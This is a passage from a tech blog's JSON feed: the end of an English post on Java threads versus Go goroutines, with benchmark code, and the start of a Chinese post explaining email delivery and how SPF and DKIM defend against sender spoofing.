class=\"token punctuation\">{</span><br>            <span class=\"token keyword\">try</span> <span class=\"token punctuation\">{</span><br>                <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span> <span class=\"token keyword\">catch</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">InterruptedException</span> e<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>                e<span class=\"token punctuation\">.</span><span class=\"token function\">printStackTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>            <span class=\"token punctuation\">}</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><br>    <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">.</span><span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">100000000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>I run this code in my Linux VM and use ps command to monitor the number of threads. It shows that the Java process creates about 1018 threads (Java creates about 18 threads to maintain JVM system, like GC.)</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">102763</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">1018</span></code></pre>\n<p>However, with the advent of technology, it becomes more common for people to connect to the internet, we all want our server could support high concurrency to serve our customers. But the thread — ever called lightweight process — becomes too heavy to support high concurrency. Why?</p>\n<h2 id=\"problem-of-thread\"><a class=\"direct-link\" href=\"#problem-of-thread\">#</a> Problem of Thread</h2>\n<ol>\n<li>Memory size<br>\nEvery time Java creates a thread, Java would allocate a fixed memory size as that thread’s stack. The number of threads would be limit by OS’s memory and SWAP size, even if your Java application does not use that much memory.<br>\nYou can use -Xss JVM option to the specific memory size of the stack used by each thread. But JVM would not run up if you specify too small memory size. Take my laptop, for example, JVM would crash if I set memory size smaller than 135k.</li>\n<li>The Cost of Create Thread and Context Switch<br>\nWhen the number of threads exceeds the number of cores, OS would arrange core to run each thread as fairs as it can through the scheduler. When one core switches one thread to another thread, it would store the current thread’s state, load another thread’s state and run it. That is the so-called context switch.<br>\nBut one thing you must know is that context switch is also cost. If there are too many threads, your core would spend too much time in context switch. Thus it would decrease your system’s throughput.</li>\n</ol>\n<p>Let’s see an actual example to show how expensive thread is. Below is a simple Java code, it uses ExecutorService with a fixed number thread pool to run the function doSomething 200000 times.</p>\n<pre class=\"language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        <span class=\"token class-name\">Random</span> random <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Random</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token keyword\">int</span> anInt <span class=\"token operator\">=</span> random<span class=\"token punctuation\">.</span><span class=\"token function\">nextInt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">InterruptedException</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">int</span> threadNum <span class=\"token operator\">=</span> <span class=\"token class-name\">Integer</span><span class=\"token punctuation\">.</span><span class=\"token function\">parseInt</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token class-name\">ExecutorService</span> executorService <span class=\"token operator\">=</span> <span class=\"token class-name\">Executors</span><span class=\"token punctuation\">.</span><span class=\"token function\">newFixedThreadPool</span><span class=\"token punctuation\">(</span>threadNum<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><br>    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> j <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> j <span class=\"token operator\">&lt;</span> <span class=\"token number\">200000</span><span class=\"token punctuation\">;</span> j<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>        executorService<span class=\"token punctuation\">.</span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Thread</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span> <span class=\"token punctuation\">{</span><br>            <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    <span class=\"token punctuation\">}</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">shutdown</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br>    executorService<span class=\"token punctuation\">.</span><span class=\"token function\">awaitTermination</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Long</span><span class=\"token punctuation\">.</span>MAX_VALUE<span class=\"token punctuation\">,</span> <span class=\"token class-name\">TimeUnit</span><span class=\"token punctuation\">.</span>NANOSECONDS<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>I run the code with the number of threads from 100 to 9900 and record the time it runs:</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/measure-thread-loading.png\" alt=\"\"></p>\n<p>You can see that it take more time to finish the process if Java creates more thread. Let dig deep into what happened by profiling CPU. When the number of threads is set to 100, about 51% of CPU time is spent in function <strong>doSomething:</strong></p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-10.png\" alt=\"\"></p>\n<p>And we increase the number of threads to 9900, the CPU time spent in function <strong>doSomething</strong> is down to about 27%.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/profile-thread-overhead-990.png\" alt=\"\"></p>\n<p>All of the metrics tell us the cost of the thread makes Java’s thread model suffer in the high concurrency scenario.</p>\n<h1 id=\"how-goroutine\"><a class=\"direct-link\" href=\"#how-goroutine\">#</a> How Goroutine</h1>\n<p>Compare to Java, Golang does not use OS’s native thread. Instead, Golang implements its scheduler, arrange goroutines to run spread between a fixed number of threads.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/go-scheduler-1.png\" alt=\"\"></p>\n<p>Every thread would switch one goroutine to another goroutine in about 10ms. And the basic police for a thread to pick a goroutine is:</p>\n<ol>\n<li>pick a goroutine from a FIFO per-thread local queue</li>\n<li>pick a goroutine from a global FIFO queue</li>\n<li>steal a goroutine from another thread’s local queue (work-stealing)</li>\n</ol>\n<blockquote>\n<p>Golang uses GOMAXPROCS parameter to determine how many threads to use in Golang application. The default value is the number of cores.</p>\n</blockquote>\n<p>To be more specific, let’s run the below go code and monitor the numbers of threads:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">100000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">doSomething</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>It shows up that the number of threads is between 4~6.</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">5</span></code></pre>\n<h2 id=\"goroutine%E2%80%99s-memory\"><a class=\"direct-link\" href=\"#goroutine%E2%80%99s-memory\">#</a> Goroutine’s Memory</h2>\n<p>Golang would allocate 4k memory to goroutine in the very beginning. As Goroutine uses more and more memory, Golang would dynamically scale up the stack size. That’s to say the number of goroutines is also bound by the size of memory, but not as suffer as Java’s thread.</p>\n<h2 id=\"blocking-system-call\"><a class=\"direct-link\" href=\"#blocking-system-call\">#</a> Blocking System Call</h2>\n<p>Since goroutines are run between threads, what if a thread were blocked by a blocking system call, like file IO?</p>\n<p>Let’s see the below graph, if three of four threads are blocked, would Golang’s throughput be impacted because there was only one thread serve Goroutine?</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-1.png\" alt=\"\"></p>\n<p>The answer is NO. To solve this problem, Golang design processor to separate goroutine.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-2.png\" alt=\"\"></p>\n<p>If a thread was blocked by a system call, Golang would create a new thread and handoff the whole processor to the new thread. Thus the processor can keep serving goroutine, and the blocking thread could keep waiting system call to finish.</p>\n<p><img src=\"/img/posts/genchilu/javas-thread-model-and-golang-goroutine/blocking-system-call-3.png\" alt=\"\"></p>\n<p>Here is a simple Golang code, create 1000 goroutine to read big file:</p>\n<pre class=\"language-go\"><code class=\"language-go\"><span class=\"token keyword\">func</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\tfi<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> os<span class=\"token punctuation\">.</span><span class=\"token function\">Open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bigfile\"</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token keyword\">defer</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br><br>\tbuf <span class=\"token operator\">:=</span> <span class=\"token function\">make</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1024</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">{</span><br>\t\tn<span class=\"token punctuation\">,</span> err <span class=\"token operator\">:=</span> fi<span class=\"token punctuation\">.</span><span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token keyword\">if</span> err <span class=\"token operator\">!=</span> <span class=\"token boolean\">nil</span> <span class=\"token operator\">&amp;&amp;</span> err <span class=\"token operator\">!=</span> io<span class=\"token punctuation\">.</span>EOF <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token function\">panic</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t\t<span class=\"token keyword\">if</span> <span class=\"token number\">0</span> <span class=\"token operator\">==</span> n <span class=\"token punctuation\">{</span><br>\t\t\t<span class=\"token keyword\">break</span><br>\t\t<span class=\"token punctuation\">}</span><br>\t<span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>\t<span class=\"token keyword\">for</span> i <span class=\"token operator\">:=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span> <span class=\"token punctuation\">{</span><br>\t\t<span class=\"token keyword\">go</span> <span class=\"token function\">readBigFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><br>\t<span class=\"token punctuation\">}</span><br><br>\ttime<span class=\"token punctuation\">.</span><span class=\"token function\">Sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span> <span class=\"token operator\">*</span> time<span class=\"token punctuation\">.</span>Minute<span class=\"token punctuation\">)</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>After running it in my Linux VM, ps command show up that the number of threads increasing to 130~200:</p>\n<pre class=\"language-bash\"><code class=\"language-bash\">**g7@g7test1**:**~**$ <span class=\"token function\">ps</span> -T <span class=\"token number\">1013506</span> <span class=\"token operator\">|</span> <span class=\"token function\">wc</span> -l<br><br><span class=\"token number\">142</span></code></pre>\n<p>So that if you use lots of goroutine to call blocking system call, the concurrency may degrade as Java’s thread model.</p>\n<blockquote>\n<p>If you want to know more about goroutine scheduler，please refer <a href=\"https://www.youtube.com/watch?v=-K11rY57K7k&amp;t=316s&amp;ab_channel=Hydra\">Go scheduler: Implementing language with lightweight concurrency</a>。</p>\n</blockquote>\n<h1 id=\"conclusion\"><a class=\"direct-link\" href=\"#conclusion\">#</a> Conclusion</h1>\n<p>So far we had discussed the challenge Java’s thread model meet in high concurrency scenario and how Golang’ goroutine solve these issue. Does that mean Java is powerless in high concurrency?</p>\n<p>Of Course NO. There is an ongoing project name <a href=\"https://blogs.oracle.com/javamagazine/going-inside-javas-project-loom-and-virtual-threads\">Loom Project</a>, it’s purpose is to implement a mechanism like goroutine in JVM. Maybe in the next Java LTS version, we could handle high concurrency in JVM gracefully, just like goroutine.</p>\n<p>By the way, what makes me feel interesting is that before Java 1.2, Java uses green thread which runs virtual thread on OS thread just like goroutine. But green thread suffers some performance issues in multi-core environment. That’s why Java decide to use native afterJava 1.3.</p>\n<p>I wonder that if OS could provide some concurrency mechanism one day as goroutine does, would programing language switch to use native mechanism instead of implementing their scheduler?</p>\n",
      "date_published": "2021-07-05T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "url": "https://tech-blog.cymetrics.io/posts/crystal/email-sec-theory/",
      "title": "關於 email security 的大小事 — 原理篇",
      "content_html": "<!-- summary -->\n<!-- 大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，讓我們來看看 email security 是什麼，又有哪些攻防機制吧！ -->\n<!-- summary -->\n<p>大家可能常常在新聞上看到某某公司遭到釣魚信件攻擊，駭客『偽冒公司員工寄信』造成受害者上當的故事。不管是交出內部服務的帳號密碼，還是下載惡意軟體中毒，都是很嚴重的後果，所以常說資安最薄弱的一環就是人的意識啊（嘆。</p>\n<p>但是釣魚信件那麼猖狂，難道就只能依靠受害者自己的意識嗎？撇除用相似的域名寄信，像是 <a href=\"http://g1thu6.com\">g1thu6.com</a> 或 <a href=\"http://app1e.com\">app1e.com</a> 的這種仔細觀察就能發現端倪的情況，如果寄信人的地址真的寫著 <a href=\"http://github.com\">github.com</a> 跟 <a href=\"http://apple.com\">apple.com</a>，我要怎麼判斷是不是釣魚啊？再謹慎的人都沒輒吧？</p>\n<p>為了讓寄件方負起一點責任，也讓收信方有驗證郵件的依據，於是出現了三種常見的驗證機制：SPF、DKIM、DMARC。但在講這三種設定前，我們首先要理解一封郵件從發信人寄出到收信人點閱中間經歷了哪些事。</p>\n<hr>\n<h2 id=\"an-email%E2%80%99s-journey\"><a class=\"direct-link\" href=\"#an-email%E2%80%99s-journey\">#</a> An Email’s Journey</h2>\n<p>想像一下，假設你要寄一封手寫的卡片給遠方的親友，你會怎麼做呢？</p>\n<p>你可能會拿一張稿紙，在開頭先寫上『親愛的X：』，接著文情並茂地寫完內文，在結尾附註『愛你的 O』，說不定還會再加上當天的日期。然後，你可能會找一個乾淨的信封，在前面寫上親友的名字以及住址，在背面寫上自己的地址或是郵局信箱位置。最後，把信紙放進信封袋密封好、貼上郵票並投入信箱，等他經過郵差先生傳遞、最後落到對方的信箱裡靜靜躺著。</p>\n<p>其實一封電子郵件的旅程也差不多如此。假設今天我要寄一封電子新年賀卡給爺爺會發生什麼事呢？我們用下面這張圖來說明。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"\"></p>\n<p>首先，我會在網頁上登入我的 gmail ，此時『網頁版 gmail 』這個應用程式就扮演著圖左上角寫著 Mail User Agent（MUA）的角色，是使用者直接互動、操作的介面。當我寫好信之好按下寄出，MUA 就會把我寫的內文（body）前面加上一些 header，包含寄信人（<code>header.From</code>）、收件人（<code>header.To</code>）、<code>header.Reply-To</code>、<code>header.BCC</code>、<code>header.CC</code>、日期等等資訊。</p>\n<p>如果你點開信件的原始資訊，會看到類似下面這一張圖的內容：</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/header.png\" alt=\"\"></p>\n<p>當 MUA 把信包裝好後，就會通過 SMTP（Simple Mail Transfer Protocol）這個協定進行身份驗證並把信包在一個信封袋（SMTP envelope）中交給 email server。這裡我用的是 gmail，以上圖來說黃色的 sender server 就是一台 gmail server。在 email server 中，首先會送到在 port 587 的 Mail Submission Agent（MSA），在這裡進行一些郵件審查與勘誤。審查的功能常用於確保符合 AD 設定的 policy，例如拒絕非同網域的收信地址、或是未經帳密驗證的寄件人等等。勘誤的部分則是會檢查是否缺少某些 header 欄位或是有格式不正確的地方。</p>\n<p>確定信件準備好送出，就會送到跑在 port 25 上的 Mail Transfer Agent（MTA）這裡。MTA 就是郵差的角色，負責的工作是透過 DNS 查詢收信人網域的 MX 紀錄找到對應的 IP，然後傳送出去。需要注意的是，MTA 並不專指在 sender 或 receiver 端 email server 中運行的程式，他在概念上類似 router ，是負責找出下一個 email server 位置並實際傳輸（relay）的軟體。所以雖然上圖中直接把左邊 sender email server 指到右邊 receiver email server，但中間傳輸過程中是可能經過多個 MTA 的。另外，MSA 與 MTA 通常同時運作在同一台主機上，不過某些比較老的 email server 不一定有 MSA 這個角色，有可能是 MUA 直接把信送到 port 25 的 MTA （此時 MTA 兼負 MSA 的職責）。</p>\n<p>前面說過，使用 SMTP 會把信包在一個信封袋（SMTP envelope）中，實際上也就是加上一些 SMTP 欄位的紀錄，例如 <code>smtp.HELO</code>、<code>smtp.MailFrom</code>、<code>smtp.RcptTo</code> 等等。所以經過 MSA 與 MTA 這些 relay 的信件都會被加上一些軌跡（trace），你可以在原始資訊中看見這些紀錄：</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/trace.png\" alt=\"\"></p>\n<p>好不容易送到使用 outlook 的爺爺那邊的 Microsoft server，然後呢？</p>\n<p>首先，MTA 收到信後一看，發現自己就是最終目的地，於是把信轉到同台主機上的 Mail Delivery Agent（MDA），又稱為 Local Delivery Agent（LDA）。MDA 的角色就像收到一大堆信件的社區管理中心，負責把信件分類好並塞到每個住戶的信箱裡，這裡說的信箱是在 email server 上的信件儲存空間 Message Store（MS）。同時，MDA 也會加上一筆 SMTP trace，並把信封袋上的 <code>smtp.MailFrom</code> 欄位放到 header 中的 <code>Return-Path</code> 欄位。</p>\n<p>最後，當爺爺打開他的桌機版 outlook （MUA）準備收信時，MUA 就會使用 POP3 或是 IMAP 協定向 email server 上運行的 POP3 / IMAP server 進行身份驗證並要求存取信件，如果驗證成功就會從 MS 中下載我給爺爺的信，這樣爺爺就能在 outlook 的介面上看到我的賀卡啦～</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/journey.png\" alt=\"\"></p>\n<p>至此我們配著圖稍微整理一下這趟旅程中的各個角色：</p>\n<ul>\n<li>Mail <strong>User</strong> Agent（MUA）：俗稱的 email client，也就是使用者介面，能讓我們編輯、瀏覽、標記、分類信件等。軟體有：Gmail、Hotmail、Outlook、Thunderbird 等。</li>\n<li>Mail <strong>Submission</strong> Agent（MSA）：寄出前將 MUA 送來的信進行審查與勘誤。不一定有專責軟體，有些 MTA 兼有 MSA 的功能。</li>\n<li>Mail <strong>Transfer</strong> Agent（MTA）：負責信件的『路由』，有時又稱為 mail relay、mail exchanger、MX host 等。軟體有：Postfix、Exim、Sendmail、qmail、Postal、Cuttlefish 等。</li>\n<li>Mail <strong>Delivery</strong> Agent（MDA）：將 MTA 傳來的信件放到 email server上的信箱儲存空間。軟體有：Cyrus IMAP、dovecot、fetchmail、sieve、courier-maildrop、getmail 等。</li>\n<li>Message Store（MS）：儲存信件的地方，可能為遠端（remote）或本地端（local），也可能有多個共同運作。</li>\n</ul>\n<hr>\n<h2 id=\"%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%80%99%E9%BA%BC%E5%A4%9A%E6%AC%84%E4%BD%8D%E5%B7%AE%E5%9C%A8%E5%93%AA%EF%BC%9F\">#</a> 這麼多欄位差在哪？</h2>\n<p>講到這裡，很多人會困惑到底前面說的信紙（<code>header.From, header.To</code>）與信封袋（<code>smtp.MailFrom, smtp.RcptTo</code>）上的欄位有何不同？不就都是寫著一樣的信箱位置嗎？</p>\n<p>其實，信紙跟信封袋上的寄信人欄位是可以不同的！</p>\n<p>在 SMTP 協議下，<code>smtp.MailFrom</code> 這個欄位其實有一個重要功能，就是指示 MTA 如果這封信寄送失敗的話，要退件到哪個地址去，所以又稱為 bounce address。一般來說如果是個人寄信的話，失敗當然就是直接回給寄件人，此時 <code>header.From = smtp.MailFrom</code>，不過如果是公司或是網站的 mailing list 這種自動化寄信給訂閱者的應用場景，有時會希望把傳送失敗的信統一集中到另一個信箱處理。另一種情境是，當信件會經過一個中繼 email server 然後被自動轉發（Forward）時，<code>header.From</code> 會是原始信件的寄件人，但 <code>smtp.MailFrom</code> 會是中繼 email server 一個專收報錯的信箱，畢竟你可不希望轉發錯誤被報錯到原始寄件人那兒啊！</p>\n<blockquote>\n<p>SMTP 欄位只有在以 SMTP 溝通的角色之間才會使用，我們在 MUA 介面上看到的寄信人等資料都是放在 header 中的。</p>\n</blockquote>\n<p>你可以想像成，信紙是給收信人（爺爺）看的，但信封袋是給郵政人員（MxA）看的，所以信封袋上的註記當然都不會讓爺爺看到囉！</p>\n<p>關於 email 的各種定義可以在 <a href=\"https://bbiw.net/specifications/draft-crocker-email-arch-03.html#Users\">Internet Mail Architecture</a> 詳細閱讀，這裡也附上 RFC 定義的欄位列表：</p>\n<ul>\n<li>originator：指的是作者（author），在上面流程中就是寫信的我</li>\n<li>relay：負責信件路由與傳送的郵差，通常指 MTA</li>\n<li>source：在定義上為『負責確保信件有效（valid）再交給 relay 』的角色，即 MUA 與 MSA</li>\n<li>mediator：指 user-level 的信件傳送，如 mailing list 這種自動轉發的中間人角色，或是 MDA 所支援的 aliasing 功能。與 MTA relay 機制不同。</li>\n</ul>\n<p><img src=\"/img/posts/crystal/email-sec-theory/identity-ref.png\" alt=\"\"></p>\n<hr>\n<h2 id=\"%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\"><a class=\"direct-link\" href=\"#%E9%82%A3%E6%94%BB%E6%93%8A%E6%98%AF%E5%A6%82%E4%BD%95%E7%99%BC%E7%94%9F%E7%9A%84%EF%BC%9F\">#</a> 那攻擊是如何發生的？</h2>\n<p>討論攻擊前請記住，</p>\n<blockquote>\n<p>SMTP 對信件本身是沒有任何驗證機制的。</p>\n</blockquote>\n<p>你只要可以用一組帳號密碼登入 SMTP server，寄信收信人欄位都任你填。SMTP authentication 只是為了保護 SMTP server 不要成為 open relay 讓任何人都能使用，並沒有保障信件本身的真實性。</p>\n<p>回顧上面的流程，我們來討論三種情境、看看這些攻擊中的『信件』有何不同。</p>\n<p>先假設</p>\n<ul>\n<li>我使用的信箱是：goodboy@gmail.com</li>\n<li>我的 email server 網域是：<a href=\"http://gmail.com\">gmail.com</a></li>\n<li>爺爺用的信箱是：grandpa@outlook.com</li>\n<li>爺爺的 email server 網域是：<a href=\"http://outlook.com\">outlook.com</a></li>\n</ul>\n<p>因此我寄出的信件上，信紙（<code>header.From</code>）與信封袋（<code>smtp.MailFrom</code>）上都會寫著 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a>。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%B8%80\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%B8%80\">#</a> 情境一</h3>\n<p>今天我的月光族表弟想要模仿我寄信給爺爺跟他要零用錢，他可以自己架起一個 email server，然後偽造一封信紙（<code>header.From</code>）與信封袋（<code>smtp.MailFrom</code>）上均寫著 <a href=\"mailto:goodboy@gmail.com\">goodboy@gmail.com</a> 的信件並寄出。爺爺的 email server 看到這封信不疑有他就送進爺爺的信箱裡，導致爺爺成功被騙，轉了一筆錢給表弟。單純從 SMTP 機制來看，<a href=\"http://outlook.com\">outlook.com</a> 眼中的信件寫著來自 <a href=\"http://gmail.com\">gmail.com</a>，那就姑且相信他！</p>\n<p>為了防範這種假冒寄信人的攻擊，2014 年 4 月 RFC 7208 正式提出一套名為 <strong>Sender Policy Framework（SPF）</strong> 的電子郵件驗證機制。這個機制的原理就是要求每個網域發一筆 DNS 紀錄，其中記載著這個網域所授權的 email server 的 IP 位置，也就是</p>\n<blockquote>\n<p>SPF：昭告天下『這些 IP 位置是我信任且核可的信件來源』</p>\n</blockquote>\n<p>當收件方 email server 要進行驗證時，MDA 就會去查詢 <code>smtp.MailFrom</code>這個網域的 DNS 紀錄，然後檢查此信件的來源 IP 是否在 SPF 紀錄中。</p>\n<p>下圖是一筆合法的 SPF 紀錄，裡面表列了允許寄信的 IP 位置，並且用 -all 宣告『除了前列 IP 之外一律拒絕』。其實 SPF 有非常多種設定，我們下一篇再談。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/spf.png\" alt=\"\"></p>\n<p>你可以在信件的原始資訊裡看到 SPF 的驗證結果，收信方的 email server（<a href=\"http://protection.outlook.com\">protection.outlook.com</a>）在確定 IP 為此 domain 的合法寄信人後，就會給出 PASS 的結果。</p>\n<p><img src=\"/img/posts/crystal/email-sec-theory/spf-result.png\" alt=\"\"></p>\n<p>如果今天 <a href=\"http://gmail.com\">gmail.com</a> 設置了 SPF 紀錄，那爺爺的 email server 在驗證時就會發現表弟所用的自架 email server 沒有在列表裡找到對應的 IP ，因此判斷為驗證失敗，成功擋下這個詐騙攻擊。</p>\n<h3 id=\"%E6%83%85%E5%A2%83%E4%BA%8C\"><a class=\"direct-link\" href=\"#%E6%83%85%E5%A2%83%E4%BA%8C\">#</a> 情境二</h3>\n<p>表弟發現攻擊失敗，只好另尋他法。他靈光一閃，發現雖然不能假冒 <a href=\"http://gmail.com\">gmail.com</a> 寄信，那他可以攔截我寄給爺爺的信，然後把裡面的欄位跟資訊改掉，這樣就可以冒充我的身份又通過 SPF 驗證啦！於是表弟竄改我的信件，把內容改成零用錢請求，又成功騙到爺爺了。</p>\n<p>為了防範情境二的這種攻擊，2011 年首次提出的 RFC 6376（後來又在 RFC 8301 與 RFC 8463 修訂）定義了 <strong>DomainKeys Identified Mail（DKIM）</strong> 這個機制。</p>\n<blockquote>\n<p>DKIM：使用數位簽章的概念來防止郵件偽造與竄改，透過公私鑰加密驗證的特性來確保訊息的完整與真實性。</p>\n</blockquote>\n<p>寄信方的 email server 會產生一組公私鑰，公鑰會用 DNS 